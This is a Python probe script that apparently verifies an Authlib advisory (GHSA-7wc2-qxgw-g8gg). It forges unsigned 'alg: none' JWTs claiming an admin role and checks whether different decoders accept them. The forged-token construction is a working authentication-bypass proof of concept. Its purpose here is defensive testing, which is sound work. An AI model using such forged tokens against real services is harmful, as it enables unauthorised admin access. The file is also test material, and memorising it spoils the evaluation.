"""Ground-truth probes for authlib-jws-none, run against one installed revision.

T1 is the advisory's PoC (GHSA-7wc2-qxgw-g8gg) for the claim under test. T2 and
T3 probe negative-control claims that sit on the same code path. The forged
token is fixed; only the RSA key is random, and no probe depends on it.
"""

import base64
import json
import sys

from authlib.jose import JsonWebKey, JsonWebToken, jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa


def b64(obj: dict) -> bytes:
    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=")


def jwks() -> dict:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pem = key.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
    )
    jwk = JsonWebKey.import_key(pem).as_dict()
    jwk.update(kid="test-key-001", use="sig", alg="RS256")
    return {"keys": [jwk]}


PAYLOAD = {"sub": "user123", "role": "admin", "iat": 1735603200}
UNSIGNED = b64({"alg": "none"}) + b"." + b64(PAYLOAD) + b"."
BOGUS_SIG = UNSIGNED + base64.urlsafe_b64encode(b"not-a-signature").rstrip(b"=")


def probe(decoder, token: bytes, keys: dict) -> str:
    try:
        claims = decoder.decode(token, keys)
        return f"ACCEPTED role={claims['role']}"
    except Exception as e:  # noqa: BLE001 - the exception type is the observation
        return f"REJECTED {type(e).__name__}"


keys = jwks()
print(json.dumps({
    "T1_default_decoder_unsigned_none": probe(jwt, UNSIGNED, keys),
    "T2_default_decoder_none_with_nonempty_signature": probe(jwt, BOGUS_SIG, keys),
    "T3_rs256_only_decoder_unsigned_none": probe(JsonWebToken(["RS256"]), UNSIGNED, keys),
}, indent=2))
sys.exit(0)
